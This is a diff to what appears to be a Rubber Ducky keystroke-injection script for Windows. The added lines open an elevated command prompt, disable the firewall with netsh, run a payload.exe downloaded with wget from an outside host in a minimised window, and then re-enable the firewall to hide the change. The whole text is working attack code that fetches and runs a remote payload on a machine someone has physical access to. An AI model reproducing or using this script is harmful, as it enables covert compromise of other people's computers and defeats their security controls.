@@ -7,6 +7,19 @@ GUI d
 DELAY 400
 GUI r
 DELAY 400
+STRING cmd
+DELAY 400
+CTRL SHIFT ENTER
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 400
+ENTER
+DELAY 800
+STRING netsh advfirewall set  currentprofile state off
+ENTER
+DELAY 400
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 1000
@@ -25,7 +38,14 @@ ENTER
 STRING wget 'http://www.example.com/payload.exe' -OutFile payload.exe
 ENTER
 DELAY 500
-STRING START payload.exe
+STRING START payload.exe -WindowStyle Minimized
+DELAY 500
 ENTER
+STRING exit
+ENTER
+DELAY 1000
+STRING netsh advfirewall set  currentprofile state on
+ENTER
+DELAY 400
 STRING exit
 ENTER
